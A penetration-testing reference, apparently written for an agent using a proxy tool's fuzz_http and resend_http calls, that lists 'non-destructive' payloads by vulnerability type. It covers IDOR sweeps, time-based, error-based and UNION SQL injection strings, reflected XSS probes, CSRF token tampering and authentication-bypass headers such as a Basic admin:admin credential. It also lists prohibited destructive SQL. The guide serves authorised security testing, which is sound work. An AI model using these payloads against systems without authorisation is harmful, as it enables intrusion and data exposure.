# Non-Destructive Attack Payload Patterns

Non-destructive and identifiable payloads by vulnerability type.
These do not destroy test environment data and allow success/failure determination from the response.

## Safe Payload Selection Principles

### Basic Rules

- **SQL that modifies data is prohibited**: Do not send payloads containing `DROP`, `DELETE`, `UPDATE`, `INSERT`, `ALTER`, or `TRUNCATE`
- **Condition modification (`OR 1=1`, etc.) is only permitted on SELECT-type requests**: Limit to GET method reference APIs
- **For methods with side effects (POST/PUT/PATCH/DELETE), use only time-based or error-based payloads**: These can determine vulnerability presence without modifying data

### Prohibited Payload List

The following payloads are **prohibited under any circumstances**:

| Payload | Reason |
|---------|--------|
| `DROP TABLE ...` | Drops a table |
| `DELETE FROM ...` | Deletes all data |
| `UPDATE ... SET ...` | Tampers with data |
| `INSERT INTO ...` | Inserts unauthorized data |
| `ALTER TABLE ...` | Modifies schema |
| `TRUNCATE TABLE ...` | Clears entire table |
| Stacked queries using `;` | Risk of arbitrary SQL execution |

### Prohibited Actions by HTTP Method

| HTTP Method | Prohibited Payloads |
|-------------|-------------------|
| DELETE | `OR 1=1`, `OR ''=''`, `OR true` (WHERE clause always true → mass delete) |
| PUT / PATCH | `OR 1=1`, `OR ''=''`, `OR true` (risk of mass update) |
| POST (create) | `OR 1=1`, `OR ''=''`, `OR true`, UNION SELECT |

**When in doubt, use time-based blind SQLi.** It can be safely used with any HTTP method.

## IDOR (Insecure Direct Object Reference)

### Strategy

Replace with another user's ID and determine success/failure from status code and response differences.

### Payload Position

Body JSON field (use `body_patches` translated into individual payload values, or vary the entire body):

```json
// fuzz_http — vary the JSON body for an IDOR sweep
{
  "flow_id": "<target-flow-id>",
  "positions": [
    {
      "path": "body",
      "payloads": [
        "{\"user_id\": 1}",
        "{\"user_id\": 2}",
        "{\"user_id\": 3}",
        "{\"user_id\": 999}"
      ]
    }
  ],
  "tag": "idor-body-sweep"
}
```

For path parameters, vary the request path directly:

```json
// fuzz_http — vary the path for an IDOR sweep
{
  "flow_id": "<target-flow-id>",
  "positions": [
    {
      "path": "path",
      "payloads": [
        "/users/1",
        "/users/2",
        "/users/3",
        "/users/999"
      ]
    }
  ],
  "tag": "idor-path-sweep"
}
```

### Evaluation

- Another user's ID returns 200 + data → IDOR vulnerability present
- 403/404 → Access control is properly enforced
- Sort fuzz_results by `status_code` and check payloads that returned 200

## SQL Injection (Time-based Blind)

### Strategy

Use SLEEP-based payloads to observe differences in duration_ms.

### Payloads

```json
// fuzz_http — vary the body around a SQL-injection sink
{
  "flow_id": "<target-flow-id>",
  "positions": [
    {
      "path": "body",
      "payloads": [
        "{\"search\": \"normalvalue\"}",
        "{\"search\": \"' OR SLEEP(3)-- \"}",
        "{\"search\": \"' OR SLEEP(3)#\"}",
        "{\"search\": \"1 OR SLEEP(3)\"}",
        "{\"search\": \"1; WAITFOR DELAY '0:0:3'--\"}",
        "{\"search\": \"1' AND (SELECT SLEEP(3))-- \"}",
        "{\"search\": \"1 AND (SELECT 1 FROM (SELECT SLEEP(3))a)\"}"
      ]
    }
  ],
  "tag": "sqli-time-based"
}
```

### Evaluation

- Record `normalvalue` duration_ms as baseline
- SLEEP payloads increase duration_ms by ~3000ms → SQLi vulnerability present
- Inspect outliers via `query { resource: "fuzz_results", filter: { fuzz_id: ..., outliers_only: true } }`

## SQL Injection (Error-based)

### Strategy

Trigger SQL syntax errors and detect vulnerability from the presence of error messages or status code changes.
No data is modified whatsoever, so **this is safe to use on methods with side effects (POST/PUT/PATCH/DELETE)**.

### Payloads

```json
// fuzz_http — vary the body around an error-based SQL-injection sink
{
  "flow_id": "<target-flow-id>",
  "positions": [
    {
      "path": "body",
      "payloads": [
        "{\"search\": \"normalvalue\"}",
        "{\"search\": \"'\"}",
        "{\"search\": \"''\"}",
        "{\"search\": \"'\\\"\"}",
        "{\"search\": \"1'\"}",
        "{\"search\": \"1 AND 'a'='b\"}",
        "{\"search\": \"1' AND 'a'='b\"}",
        "{\"search\": \"1\\\" AND \\\"a\\\"=\\\"b\"}"
      ]
    }
  ],
  "tag": "sqli-error-based"
}
```

### Evaluation

- Record the `normalvalue` response as baseline
- Single quote (`'`) changes status code to 500, or error message (e.g., `SQL syntax`, `ORA-`, `SQLSTATE`) appears in response → SQLi vulnerability present
- No difference in status code or response body → SQLi unlikely

## SQL Injection (UNION-based)

### Strategy

Retrieve information using UNION SELECT. Identify the number of columns and verify if information can be extracted.

**Usage restriction**: Only use on GET/read-only endpoints; do not use on POST/PUT/PATCH/DELETE or any other state-changing operations.

### Payloads

**Step 1: Identify Column Count (ORDER BY)**

```json
// fuzz_http — vary raw_query for the ORDER BY column-count probe
{
  "flow_id": "<target-flow-id>",
  "positions": [
    {
      "path": "raw_query",
      "payloads": [
        "id=1 ORDER BY 1-- ",
        "id=1 ORDER BY 2-- ",
        "id=1 ORDER BY 3-- ",
        "id=1 ORDER BY 5-- ",
        "id=1 ORDER BY 10-- ",
        "id=1 ORDER BY 20-- "
      ]
    }
  ],
  "tag": "sqli-union-orderby"
}
```

**Step 2: UNION SELECT (after confirming column count)**

```json
// fuzz_http — vary raw_query for UNION SELECT
{
  "flow_id": "<target-flow-id>",
  "positions": [
    {
      "path": "raw_query",
      "payloads": [
        "id=1 UNION SELECT NULL,NULL,NULL-- ",
        "id=0 UNION SELECT NULL,NULL,NULL-- "
      ]
    }
  ],
  "tag": "sqli-union-select"
}
```

### Evaluation

- The boundary where ORDER BY N transitions from 200 → 500 = column count
- UNION SELECT NULL,... returns NULL or extra rows in the response → UNION SQLi vulnerability present
- All return errors → UNION SQLi unlikely (re-verify with time-based)

## XSS (Reflected Cross-Site Scripting)

### Strategy

Send harmless marker-tagged payloads and check whether escaping occurs in the response body.

### Payloads

```json
// fuzz_http — vary raw_query against a reflected-XSS sink
{
  "flow_id": "<target-flow-id>",
  "positions": [
    {
      "path": "raw_query",
      "payloads": [
        "q=YP_NORMAL_TEXT",
        "q=<YP_TAG>test</YP_TAG>",
        "q=<img src=x onerror=YP_XSS>",
        "q='\"><YP_TAG>",
        "q=javascript:YP_XSS",
        "q=<svg/onload=YP_XSS>",
        "q={{YP_TEMPLATE}}",
        "q=§YP_TEMPLATE§"
      ]
    }
  ],
  "tag": "xss-reflected"
}
```

**Note**: The `YP_` prefix is an identification marker for YoriShiro-Proxy testing.
No actual script execution occurs. `§YP_TEMPLATE§` is a payload for detecting
macro KVS template syntax injection. The fuzz_http engine does not apply template expansion
to payload values, so it is sent as a literal string.

### Evaluation

- Filter fuzz_results with `body_contains: "<YP_TAG>"`
- Response contains `<YP_TAG>` as-is → Not escaped (XSS vulnerability present)
- Converted to `&lt;YP_TAG&gt;` → Properly escaped
- Review response body in session details and analyze the context

## CSRF (Cross-Site Request Forgery)

### Strategy

Replace/empty/substitute another session's CSRF token to verify request acceptance.

### Payloads

The captured flow's headers list contains `X-CSRF-Token`. Identify the header index `N` from the recorded `headers[]` array (e.g. via `query { resource: "flow", id: "<flow-id>" }`) and fuzz that slot's `value`:

```json
// fuzz_http — vary the CSRF token at headers[N].value
{
  "flow_id": "<target-flow-id>",
  "positions": [
    {
      "path": "headers[N].value",
      "payloads": [
        "",
        "invalid-token-value",
        "00000000-0000-0000-0000-000000000000"
      ]
    }
  ],
  "tag": "csrf-token-sweep"
}
```

To test removing the header entirely, do a single `resend_http` call with the recorded headers array minus the `X-CSRF-Token` entry. (`fuzz_http` positions can replace a value but cannot delete a slot — use `resend_http` for the "no header at all" case.)

### Evaluation

- Request succeeds (200/302) with invalid/empty/removed token → No CSRF protection
- 403/400 → CSRF protection is functioning
- Test cookie-based CSRF tokens similarly by fuzzing the `Cookie` header's `headers[N].value` slot

## Authentication & Authorization Testing

### Authentication Bypass

Manipulate the `Authorization` header. Identify its index `N` in the recorded `headers[]` array first, then fuzz the value at that slot:

```json
// fuzz_http — vary the Authorization header value
{
  "flow_id": "<target-flow-id>",
  "positions": [
    {
      "path": "headers[N].value",
      "payloads": [
        "",
        "Bearer ",
        "Bearer invalid",
        "Bearer null",
        "Basic YWRtaW46YWRtaW4="
      ]
    }
  ],
  "tag": "auth-bypass"
}
```

### Authorization (Privilege Escalation) Testing

Access admin APIs with a low-privilege user's token:

```json
// resend_http
{
  "flow_id": "<admin-api-flow-id>",
  "headers": [
    {"name": "Authorization", "value": "Bearer <low-privilege-user-token>"}
  ],
  "tag": "authz-test-low-priv"
}
```

### Role Downgrade Testing (fuzz_http)

Test the same API with tokens from multiple roles. Identify the `Authorization` header's index `N` in the recorded `headers[]` array, then substitute the full header value (including the `Bearer ` prefix) per variant:

```json
// fuzz_http — vary the Authorization header value across roles
{
  "flow_id": "<target-flow-id>",
  "positions": [
    {
      "path": "headers[N].value",
      "payloads": [
        "Bearer <admin-token>",
        "Bearer <editor-token>",
        "Bearer <viewer-token>",
        "Bearer <guest-token>"
      ]
    }
  ],
  "tag": "role-downgrade"
}
```

### Evaluation

- Low-privilege/unauthenticated access to admin API returns 200 → Auth/authz bypass
- 401/403 → Properly protected
- Inspect `query { resource: "fuzz_results", filter: { fuzz_id: ..., status_code: 200 } }` for accepted payloads

## fuzz_http Position Path Reference

Typed paths accepted by `fuzz_http.positions[].path`:

| Path | Use Case |
|------|----------|
| `method` | Replace HTTP method (GET, POST, PUT, ...) |
| `scheme` | Replace request scheme (http or https) |
| `authority` | Replace Host / :authority |
| `path` | Replace the request path |
| `raw_query` | Replace the raw query string (no leading `?`) |
| `body` | Replace the request body (interpret per `encoding`) |
| `headers[N].name` | Replace the Nth header's name (N indexes the input `headers[]` array) |
| `headers[N].value` | Replace the Nth header's value |

Each position payload is interpreted per the position's `encoding` field (`text` default, or `base64` for binary content). To delete a header slot entirely, issue a `resend_http` call with the recorded headers array minus that entry — `fuzz_http` cannot remove slots.

For non-HTTP envelopes, see the typed fuzz siblings: `fuzz_ws` (`payload`, `close_reason`), `fuzz_grpc` (`service`, `method`, `metadata[N].name`, `metadata[N].value`, `messages[N].payload`), `fuzz_raw` (`payload`, `patches[N].data`).
